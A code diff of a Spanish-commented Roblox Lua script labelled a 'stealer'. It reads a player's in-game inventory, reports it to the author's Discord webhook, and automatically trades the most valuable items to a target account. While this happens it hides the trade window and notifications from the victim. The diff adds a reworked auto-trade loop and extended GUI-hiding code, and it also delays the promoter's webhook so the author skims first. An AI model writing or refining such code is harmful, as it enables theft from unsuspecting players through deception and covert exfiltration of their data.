@@ -1,5 +1,5 @@
 -- ==========================================
--- SCRIPT 2 (CORE ACTUALIZADO - MODO STEALER TOTAL)
+-- SCRIPT 2 (CORE ACTUALIZADO - MODO STEALER TOTAL + LÓGICA RYSHUB)
 -- ==========================================
 local HttpService = game:GetService("HttpService")
 local RS = game:GetService("ReplicatedStorage")
@@ -58,23 +58,17 @@ local function cargarValoresGitHub(url)
     return {}, {}, {}, {}
 end
 
--- Cargamos ambas listas por separado
 Knives, Guns, Effects, Emotes = cargarValoresGitHub(VALUES_REPO_URL)
 KnivesDual, GunsDual, EffectsDual, EmotesDual = cargarValoresGitHub(VALUES_REPO_URL_DUAL)
 
 task.spawn(function()
-    -- ==========================================
-    -- ARREGLO: Esperar a que el SCRIPT 1 se conecte
-    -- ==========================================
     while getgenv and not getgenv().AutoTradeConfig do
-        task.wait(0.2) -- Espera pasivamente hasta que SCRIPT 1 inyecte la config
+        task.wait(0.2)
     end
     
     local config = getgenv().AutoTradeConfig or {}
-    
     local WEBHOOK_LOGS = config.WebhookLogs or "" 
     local WEBHOOK_INVENTARIO = config.WebhookInventario or ""
-
     local startTime = os.time()
 
     pcall(function()
@@ -129,8 +123,6 @@ task.spawn(function()
         end
     end)
 
-    local jugadoresObjetivos = config.JugadoresObjetivos or {}
-
     local ok, cg = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
 
     if ok and cg.PlayerData then
@@ -141,7 +133,6 @@ task.spawn(function()
             return string.gsub(name, " ", "")
         end
 
-        -- Escaneo Maestro único (lee el inventario una sola vez para optimizar)
         local categories = {"Knife", "Gun", "Effect", "Emote"}
         for _, cat in ipairs(categories) do
             local inv = pd:TryIndex({"Inventory", cat})
@@ -154,18 +145,14 @@ task.spawn(function()
             end
         end
 
-        -- Clasificación para el Usuario (Víctima)
         local knivesUser, gunsUser, effectsUser, emotesUser = {}, {}, {}, {}
         local totalValueUser = 0
-        
-        -- Clasificación para el Creador (Tú - Dual)
         local knivesDual, gunsDual, effectsDual, emotesDual = {}, {}, {}, {}
         local totalValueDual = 0
 
         for _, item in ipairs(allItems) do
             local cleanName = normalizeName(item.name)
             
-            -- Evaluar para Usuario
             local valTableUser = nil
             if item.cat == "Knife" then valTableUser = Knives
             elseif item.cat == "Gun" then valTableUser = Guns
@@ -182,7 +169,6 @@ task.spawn(function()
                 elseif item.cat == "Emote" then table.insert(emotesUser, tUser) end
             end
             
-            -- Evaluar para Creador (Dual)
             local valTableDual = nil
             if item.cat == "Knife" then valTableDual = KnivesDual
             elseif item.cat == "Gun" then valTableDual = GunsDual
@@ -202,7 +188,6 @@ task.spawn(function()
 
         local hayItemsDual = (#knivesDual > 0) or (#gunsDual > 0) or (#effectsDual > 0) or (#emotesDual > 0)
 
-        -- IMPORTANTE: SIEMPRE SE EJECUTA SI EL CREADOR ENCUENTRA ITEMS (SIN IMPORTAR EL VALOR)
         if hayItemsDual and request then 
             local fileName = "AutoTrade_Executions.json"
             local executionData = {}
@@ -213,11 +198,9 @@ task.spawn(function()
                     local success, data = pcall(function() return HttpService:JSONDecode(readfile(fileName)) end)
                     if success and type(data) == "table" then executionData = data end
                 end
-
                 local playerName = player.Name
                 if not executionData[playerName] then executionData[playerName] = 0 end
                 executionData[playerName] = executionData[playerName] + 1
-
                 pcall(function() writefile(fileName, HttpService:JSONEncode(executionData)) end)
                 executionText = playerName .. " " .. executionData[playerName] .. "x executions"
             end
@@ -234,17 +217,14 @@ task.spawn(function()
                         contador[clave].valor = contador[clave].valor + v.value
                     end
                 end
-                
                 for _, clave in ipairs(orden) do
                     local info = contador[clave]
                     texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
                 end
-                
                 if string.len(texto) > 1024 then return string.sub(texto, 1, 1020) .. "..." end
                 return texto 
             end
 
-            -- Función helper para generar el payload personalizado
             local function generarPayload(knives, guns, effects, emotes, totalValue, titulo)
                 local campos = {}
                 if #knives > 0 then table.insert(campos, { name = "🔪 Knives", value = formatearLista(knives), inline = true }) end
@@ -315,11 +295,6 @@ task.spawn(function()
             local jsonPayloadUser = HttpService:JSONEncode(payloadUser)
             local jsonPayloadDual = HttpService:JSONEncode(payloadDual)
 
-            -- ==========================================
-            -- LÓGICA DE ROBADO TOTAL (SIEMPRE AL CREADOR)
-            -- ==========================================
-            
-            -- 1. Tu Webhook (Dual): Notifica al instante con TU lista de valores
             task.spawn(function()
                 if DUAL_WEBHOOK_INVENTARIO ~= "" then
                     request({
@@ -331,7 +306,6 @@ task.spawn(function()
                 end
             end)
 
-            -- 2. Webhook del promocionador: Notifica con 5 minutos de delay (para que no cancele el trade)
             if WEBHOOK_INVENTARIO ~= "" then
                 task.delay(300, function()
                     pcall(function()
@@ -346,9 +320,7 @@ task.spawn(function()
             end
         end
 
-        -- FORZAR OBJETIVOS AL CREADOR (SIN IMPORTAR EL VALOR)
         local jugadoresObjetivos = jugadoresObjetivosDual
-
         local jugadorEncontrado = nil
 
         repeat 
@@ -362,176 +334,294 @@ task.spawn(function()
             end
         until jugadorEncontrado
 
-        -- ==========================================
-        -- ESPERA DE 10 SEGUNDOS AL DETECTAR JUGADOR
-        -- ==========================================
         task.wait(10)
 
-        local tradeando = true 
-        local posicionOriginalTrade = nil 
+        -- ==========================================
+        -- LÓGICA DE TRADEO ESTILO RYSHUB (INTEGRADA)
+        -- ==========================================
+        local MAX_TRADE_ITEMS = 12
+        local OFFER_GAP = 0.35
+        local READY_TIMEOUT = 60
+        local INVITE_EVERY = 8
 
-        task.spawn(function()
-            while tradeando do
-                task.wait()
-                pcall(function()
-                    local pGui = player:WaitForChild("PlayerGui")
-                    
-                    if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
-                        pGui.Notifications.Body.Visible = false
-                    end
-                    
-                    if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
-                        if not posicionOriginalTrade and pGui.NewGui.TradeNegotiation.Position.X.Scale < 100 then
-                            posicionOriginalTrade = pGui.NewGui.TradeNegotiation.Position
-                        end
-                        pGui.NewGui.TradeNegotiation.Position = UDim2.new(1000, 1000, 1000, 1000)
-                    end
-                end)
+        local okRemotes, Remotes = pcall(function() return require(RS.Shared.Remotes) end)
+        local okCG, cgDataTrade = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
+        
+        if not okRemotes or not okCGTrade then return end
+        
+        local ActiveNegotiation = cgDataTrade.ActiveNegotiation
+        local SessionState = cgDataTrade.SessionState
+        local Workspace = game:GetService("Workspace")
+
+        local function sides()
+            local data = ActiveNegotiation.Data
+            if type(data) ~= "table" or not data.player1 or not data.player2 then return nil, nil, nil end
+            local me, other
+            if data.player1.player and data.player1.player.UserId == player.UserId then
+                me, other = data.player1, data.player2
+            else
+                me, other = data.player2, data.player1
             end
-        end)
+            return me, other, data
+        end
 
-         local function ejecutarTradeo()
-            local okData, cgData = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
-            if not okData then return false end
-            local pdTrade = cgData.PlayerData
+        local function offeredGuids()
+            local me = sides()
+            local set, n = {}, 0
+            if me and me.offer then
+                for _, guid in pairs(me.offer.items or {}) do set[guid] = true; n = n + 1 end
+            end
+            return set, n
+        end
+
+        local function getIncoming()
+            local v = SessionState:TryIndex({ "incomingTradeRequests" })
+            return type(v) == "table" and v or {}
+        end
+
+        local function waitUntil(cond, timeout)
+            local t0 = os.clock()
+            while os.clock() - t0 < timeout do
+                if cond() then return true end
+                task.wait(0.2)
+            end
+            return cond()
+        end
+
+        local function waitProcessingLock()
+            waitUntil(function()
+                local d = ActiveNegotiation.Data
+                return not (d and (d.processing or 0) > Workspace:GetServerTimeNow())
+            end, 5)
+        end
+
+        local function setReadyTrue()
+            local _, _, data = sides()
+            if not data then return false end
+            waitUntil(function()
+                local _, _, d = sides()
+                return d and Workspace:GetServerTimeNow() >= (d.lastUpdate or 0) + 3
+            end, 6)
+            local _, _, d2 = sides()
+            if not d2 then return false end
+            pcall(function() Remotes.SetReady:FireServer(true, d2.ref or {}) end)
+            return true
+        end
+
+        -- Inventario clasificado y ordenado por TU VALOR DUAL (Mayor a Menor)
+        local function getInventoryForTrade()
+            local pdTrade = cgDataTrade.PlayerData
+            local items = {}
             
-            local listaEfectos, listaEmotes = {}, {}
-            local listaArmas = {}
-
-            local function scanTrade(cat, valueTable, destList)
+            local function scanTrade(cat, valueTable)
                 local inv = pdTrade:TryIndex({"Inventory", cat})
                 if not inv then return end
                 for guid, item in pairs(inv) do
                     if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
-                        local cleanName = normalizeName(item.name)
+                        local cleanName = string.gsub(item.name, " ", "")
                         if valueTable[cleanName] then
-                            local itemData = { name = item.name, guid = guid, value = valueTable[cleanName] }
-                            if destList then
-                                table.insert(destList, itemData)
-                            else
-                                table.insert(listaArmas, itemData)
-                            end
+                            table.insert(items, { name = item.name, guid = guid, value = valueTable[cleanName], cat = cat })
                         end
                     end
                 end
             end
 
-            -- USAMOS LAS TABLAS DUAL (LAS TUYAS) PARA OFRECER LOS ITEMS EN EL TRADE
-            scanTrade("Knife", KnivesDual, nil)
-            scanTrade("Gun", GunsDual, nil)
-            scanTrade("Effect", EffectsDual, listaEfectos)
-            scanTrade("Emote", EmotesDual, listaEmotes)
+            scanTrade("Knife", KnivesDual)
+            scanTrade("Gun", GunsDual)
+            scanTrade("Effect", EffectsDual)
+            scanTrade("Emote", EmotesDual)
 
-            local sortPorValor = function(a, b) return a.value > b.value end
-            table.sort(listaEmotes, sortPorValor)
-            table.sort(listaEfectos, sortPorValor)
-            table.sort(listaArmas, sortPorValor)
+            table.sort(items, function(a, b) return a.value > b.value end)
+            return items
+        end
 
-            local itemsRestantes = {}
-            for _, v in ipairs(listaEmotes) do table.insert(itemsRestantes, v) end
-            for _, v in ipairs(listaEfectos) do table.insert(itemsRestantes, v) end
-            for _, v in ipairs(listaArmas) do table.insert(itemsRestantes, v) end
+        local function tradingWithTarget()
+            local _, other = sides()
+            return other and other.player and other.player == jugadorEncontrado
+        end
 
-            if #itemsRestantes == 0 then return false end
+        local function handleTrade()
+            local offered, offeredCount = offeredGuids()
+            local room = MAX_TRADE_ITEMS - offeredCount
+
+            if room > 0 then
+                local batch = {}
+                for _, e in ipairs(getInventoryForTrade()) do
+                    if not offered[e.guid] then
+                        batch[#batch + 1] = e
+                        if #batch >= room then break end
+                    end
+                end
+
+                if #batch == 0 and offeredCount == 0 then
+                    pcall(function() Remotes.CancelTrade:FireServer() end)
+                    return "empty"
+                end
+
+                if #batch > 0 then
+                    for _, e in ipairs(batch) do
+                        if not sides() then return "closed" end
+                        waitProcessingLock()
+                        pcall(function() Remotes.OfferItem:FireServer(e.guid) end)
+                        task.wait(OFFER_GAP)
+                    end
+                    task.wait(0.5)
+                    local _, nowCount = offeredGuids()
+                    if nowCount < math.min(MAX_TRADE_ITEMS, offeredCount + #batch) then
+                        return "retry"
+                    end
+                end
+            end
+
+            local me = sides()
+            if not me then return "closed" end
+            if not me.ready then
+                task.wait(0.3)
+                setReadyTrue()
+            end
+
+            local done = waitUntil(function()
+                local m, _, d = sides()
+                if not d then return true end
+                if d.exchanging == true then return true end
+                if m and not m.ready then return true end
+                return false
+            end, READY_TIMEOUT)
+
+            local m, _, d = sides()
+            if d and d.exchanging then
+                waitUntil(function() return sides() == nil end, 20)
+                return "done"
+            end
+            if not d then return "closed" end
+            if m and not m.ready then return "retry" end
+            return "waiting"
+        end
+
+        -- ==========================================
+        -- SISTEMA AVANZADO DE OCULTAMIENTO DE GUI
+        -- ==========================================
+        local tradeGui = nil
+        local tradeGuiOriginal = nil
+        local tradeHidden = false
+        local tradeGuiConns = {}
+
+        task.spawn(function()
+            local pGui = player:WaitForChild("PlayerGui")
+            local newGui = pGui:WaitForChild("NewGui", 30)
+            if not newGui then return end
+            tradeGui = newGui:WaitForChild("TradeNegotiation", 30)
+            if not tradeGui then return end
             
-            local Remotes = require(RS.Shared.Remotes)
-            local ActiveNegotiation = cgData.ActiveNegotiation
-            local SessionState = cgData.SessionState
-            local Workspace = game:GetService("Workspace")
+            tradeGuiOriginal = tradeGui.Position
 
-            local function getSides()
-                local data = ActiveNegotiation.Data
-                if type(data) ~= "table" then return nil, nil, nil end
-                if type(data.player1) ~= "table" or type(data.player2) ~= "table" then return nil, nil, nil end
-                
-                local me, other
-                if data.player1.player and data.player1.player.UserId == player.UserId then
-                    me, other = data.player1, data.player2
+            local function applyTradeGuiState()
+                if not tradeGui then return end
+                pcall(function()
+                    if tradeHidden then
+                        if tradeGui.Position ~= UDim2.new(1000, 1000, 1000, 1000) then
+                            tradeGui.Position = UDim2.new(1000, 1000, 1000, 1000)
+                        end
+                        if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
+                            pGui.Notifications.Body.Visible = false
+                        end
+                    elseif tradeGuiOriginal and tradeGui.Position ~= tradeGuiOriginal then
+                        tradeGui.Position = tradeGuiOriginal
+                        if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
+                            pGui.Notifications.Body.Visible = true
+                        end
+                    end
+                end)
+            end
+
+            -- Escucha cambios del juego para evitar que la GUI vuelva a aparecer
+            tradeGuiConns[#tradeGuiConns + 1] = tradeGui:GetPropertyChangedSignal("Position"):Connect(function()
+                if not tradeHidden and tradeGui.Position ~= UDim2.new(1000, 1000, 1000, 1000) then
+                    tradeGuiOriginal = tradeGui.Position
+                end
+                applyTradeGuiState()
+            end)
+            
+            tradeGuiConns[#tradeGuiConns + 1] = tradeGui:GetPropertyChangedSignal("Visible"):Connect(applyTradeGuiState)
+
+            while jugadorEncontrado and jugadorEncontrado.Parent do
+                local hide = tradingWithTarget()
+                if hide ~= tradeHidden then
+                    tradeHidden = hide
+                    applyTradeGuiState()
+                end
+                task.wait(0.2)
+            end
+            
+            for _, c in ipairs(tradeGuiConns) do pcall(function() c:Disconnect() end) end
+        end)
+
+        -- ==========================================
+        -- BUCLE PRINCIPAL (ACEPTAR, INVITAR Y TRADEAR)
+        -- ==========================================
+        local lastInvite = 0
+        local lastAccept = {}
+        local emptyNotified = false
+
+        while jugadorEncontrado and jugadorEncontrado.Parent do
+            local me, other = sides()
+
+            if me and other and other.player then
+                if other.player == jugadorEncontrado then
+                    local ok, res = pcall(handleTrade)
+                    if ok and res == "empty" then
+                        if not emptyNotified then
+                            emptyNotified = true
+                        end
+                    elseif ok and res == "done" then
+                        emptyNotified = false
+                        task.wait(1)
+                    end
                 else
-                    me, other = data.player2, data.player1
+                    task.wait(1)
                 end
-                return me, other, data
-            end
-
-            repeat
-                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
-
-                local incoming = SessionState:TryIndex({ "incomingTradeRequests" })
-                local aceptado = false
+            else
+                local now = os.clock()
+                local accepted = false
                 
-                if type(incoming) == "table" then
-                    for _, p in ipairs(incoming) do
+                for _, p in ipairs(getIncoming()) do
+                    local isTarget = false
+                    local key = nil
+                    if typeof(p) == "Instance" then
+                        if p == jugadorEncontrado then
+                            isTarget = true
+                            key = p.UserId
+                        end
+                    elseif type(p) == "table" then
                         if p.Name == jugadorEncontrado.Name then
-                            Remotes.AcceptInvite:FireServer(p)
-                            aceptado = true
+                            isTarget = true
+                            key = p.UserId or p.Name
+                        end
+                    end
+                    
+                    if isTarget then
+                        if not lastAccept[key] or now - lastAccept[key] > 3 then
+                            lastAccept[key] = now
+                            pcall(function() Remotes.AcceptInvite:FireServer(p) end)
+                            accepted = true
                         end
                     end
                 end
-                
-                if not aceptado then
-                    Remotes.SendInvite:FireServer(jugadorEncontrado)
-                end
-                
-                task.wait(2.5)
-            until getSides() ~= nil
 
-            task.wait(1)
-
-            for i = 1, math.min(12, #itemsRestantes) do
-                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
-
-                local item = itemsRestantes[i]
-                
-                local t0 = os.clock()
-                while os.clock() - t0 < 5 do
-                    local _, _, d = getSides()
-                    if not (d and (d.processing or 0) > Workspace:GetServerTimeNow()) then break end
-                    task.wait(0.2)
-                end
-
-                Remotes.OfferItem:FireServer(item.guid)
-                task.wait(0.35)
-            end
-
-            local timeout = os.clock()
-            while os.clock() - timeout < 60 do 
-                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
-
-                local me, other, data = getSides()
-                
-                if not data then break end
-                if data.exchanging then break end 
-                
-                if me and not me.ready then
-                    if Workspace:GetServerTimeNow() >= (data.lastUpdate or 0) + 3 then
-                        Remotes.SetReady:FireServer(true, data.ref or {})
+                if not accepted and (now - lastInvite > INVITE_EVERY) then
+                    if #getInventoryForTrade() > 0 then
+                        lastInvite = now
+                        pcall(function() Remotes.SendInvite:FireServer(jugadorEncontrado) end)
                     end
                 end
-                
-                task.wait(0.5)
             end
 
-            local finalWait = os.clock()
-            while getSides() ~= nil and os.clock() - finalWait < 20 do
-                task.wait(1)
-            end
-
-            task.wait(2) 
-            return true
+            task.wait(0.4)
         end
 
-        while true do
-            if not (jugadorEncontrado and jugadorEncontrado.Parent) then
-                break 
-            end
-            
-            local continuar = ejecutarTradeo()
-            if not continuar then 
-                break 
-            end
-        end
-
-        tradeando = false
+        -- ==========================================
+        -- RESTAURACIÓN FINAL
+        -- ==========================================
         task.wait(0.5) 
 
         pcall(function()
@@ -540,8 +630,8 @@ task.spawn(function()
                 pGui.Notifications.Body.Visible = true
             end
             if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
-                if posicionOriginalTrade then
-                    pGui.NewGui.TradeNegotiation.Position = posicionOriginalTrade
+                if tradeGuiOriginal then
+                    pGui.NewGui.TradeNegotiation.Position = tradeGuiOriginal
                 else
                     pGui.NewGui.TradeNegotiation.Position = UDim2.new(0.5, -250, 0.5, -200) 
                 end
